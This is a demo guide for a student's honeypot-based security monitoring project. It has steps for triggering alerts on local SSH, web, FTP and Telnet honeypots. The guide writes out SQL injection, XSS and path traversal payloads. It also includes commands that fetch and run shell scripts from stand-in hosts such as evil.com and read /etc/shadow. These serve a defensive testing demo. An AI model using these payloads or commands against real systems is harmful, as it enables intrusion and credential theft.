# 🛡 SOC Honeypot System — Live Demo Guide
### Vetrivel T · RA2331021020005 | Final Year Cybersecurity Project

---

## ⚡ STEP 1 — Start the System

Open **one terminal** in `C:\Users\vetri\Desktop\FYProject` and run:

```
cd C:\Users\vetri\Desktop\FYProject
python main.py
```

You should see these lines (all services starting):
```
[INFO] Starting Web Honeypot on port 8080
[INFO] Starting Telnet Honeypot on port 2323
[INFO] Starting FTP Honeypot on port 2121
[INFO] SOC Dashboard running on http://localhost:5000
[INFO] Cowrie SSH bridge watching logs...
```

---

## 🖥 STEP 2 — Open the SOC Dashboard

Open Chrome and go to:
```
http://localhost:5000
```

You will see:
- Live Attack Map (India location for local attacks)
- Live Event Feed
- AI Attacker Profiler
- Stat cards (Total Attacks, Critical, High, etc.)

---

## 🎯 STEP 3 — ATTACK COMMANDS (Run in a NEW terminal)

### ─── 1. SSH Brute Force Attack (Cowrie)
```
ssh root@localhost -p 2222
```
Try passwords: `root`, `123456`, `admin`, `password`, `toor`

For **rapid brute force** (triggers Critical alert):
```
ssh admin@localhost -p 2222
ssh root@localhost -p 2222
ssh test@localhost -p 2222
ssh oracle@localhost -p 2222
ssh ubuntu@localhost -p 2222
```
Run these 5 commands quickly one after another.

**After login** (use password `root` or `123456`), try these commands:
```
whoami
cat /etc/passwd
cat /etc/shadow
uname -a
wget http://malware.example.com/shell.sh
curl http://evil.com/backdoor
chmod +x shell.sh
./shell.sh
```
These trigger **AI Profiling** — classified as SKILLED or SCRIPT KIDDIE.

---

### ─── 2. Web Honeypot Attacks (HTTP)
Open browser or run in terminal:

**SQL Injection:**
```
curl "http://localhost:8080/search?q=' OR 1=1 --"
curl "http://localhost:8080/login" -d "username=admin' OR '1'='1&password=anything"
```

**XSS Attack:**
```
curl "http://localhost:8080/search?q=<script>alert('XSS')</script>"
```

**Directory Traversal:**
```
curl "http://localhost:8080/search?q=../../../../etc/passwd"
```

**Admin Panel Probe (triggers High alert):**
```
curl http://localhost:8080/admin
curl http://localhost:8080/wp-admin
curl http://localhost:8080/phpmyadmin
curl http://localhost:8080/.env
curl http://localhost:8080/shell.php
curl http://localhost:8080/c99.php
```

**Fake Login Brute Force:**
```
curl http://localhost:8080/login -d "username=admin&password=admin"
curl http://localhost:8080/login -d "username=admin&password=123456"
curl http://localhost:8080/login -d "username=root&password=root"
```

**API Probe:**
```
curl http://localhost:8080/api/users
curl http://localhost:8080/api/data
```

---

### ─── 3. FTP Honeypot Attack
Open **Command Prompt** and run:
```
ftp localhost 2121
```
Login attempts:
- Username: `admin`, Password: `admin`
- Username: `root`,  Password: `root`
- Username: `user`,  Password: `123456`

> ⚠️ Note: Chrome/browser does NOT support FTP — must use cmd `ftp` command or FileZilla.
> In FileZilla: Host = `localhost`, Port = `2121`, any username/password.

---

### ─── 4. Telnet Honeypot Attack
```
telnet localhost 2323
```
Try login: `root / root`, `admin / admin`, `admin / password`

---

### ─── 5. Trigger CRITICAL Alert (fastest way)
Run this in terminal — rapid multi-service attack:
```
ssh root@localhost -p 2222
ssh admin@localhost -p 2222
ssh test@localhost -p 2222
ssh root@localhost -p 2222
ssh admin@localhost -p 2222
ssh root@localhost -p 2222
```
6 SSH attempts in under 10 seconds → **Critical Brute Force** alert fires.
- 🔴 Dashboard turns red
- 🔔 Popup appears
- 📧 Email sent to honey.checkpot@gmail.com
- 📱 Telegram alert fired

---

## 📋 STEP 4 — What to Show on Dashboard

| Feature | What to Click / Show |
|---|---|
| Live Attack Map | Show marker on Tamil Nadu, India — click it |
| AI Attacker Profiler | Show BOT / SCRIPT KIDDIE / SKILLED badges |
| Investigation Panel | Click any event in Live Feed OR click "Investigate" button |
| MITRE ATT&CK | Scroll down — shows T1110 Brute Force, T1059 Command Execution etc. |
| Alert Popup | Trigger Critical SSH attack — red popup appears |
| PDF Report | Click "Download Report" button top-right |
| Telegram Alert | Show phone — alert received in real time |
| Email Alert | Show honey.checkpot@gmail.com inbox |

---

## 🤖 STEP 5 — Show AI Attacker Profiling (Unique Feature)

After attacks, scroll down to **AI Attacker Profiler** panel. Explain:

- 🤖 **BOT** — high volume, no commands, single attack type (port scanner)
- 💀 **SCRIPT KIDDIE** — uses wget/curl, /tmp/, reverse shells, Metasploit tools
- 🎯 **SKILLED** — uses recon commands, reads /etc/shadow, lateral movement

To trigger SKILLED classification, login to SSH and run:
```
cat /etc/passwd
cat /etc/shadow
uname -a
id
whoami
netstat -an
ps aux
```

---

## 🛑 STEP 6 — Stop the System

Press `Ctrl + C` in the main.py terminal.

---

## 🔁 Quick Restart (if something crashes)

```
cd C:\Users\vetri\Desktop\FYProject
python main.py
```
Then hard refresh dashboard: `Ctrl + Shift + R`

---

## 📌 Port Reference

| Service | Port | How to Access |
|---|---|---|
| SOC Dashboard | 5000 | http://localhost:5000 |
| Web Honeypot | 8080 | http://localhost:8080 |
| SSH Honeypot (Cowrie) | 2222 | ssh user@localhost -p 2222 |
| Telnet Honeypot | 2323 | telnet localhost 2323 |
| FTP Honeypot | 2121 | ftp localhost 2121 |

---

## 📧 Alert Destinations

| Alert Type | Destination |
|---|---|
| Email | honey.checkpot@gmail.com |
| Telegram | Bot: @YourHoneypotBot (Chat ID: 1135963247) |

---

*Advanced Multi-Service Honeypot SOC System · Vetrivel T · RA2331021020005*
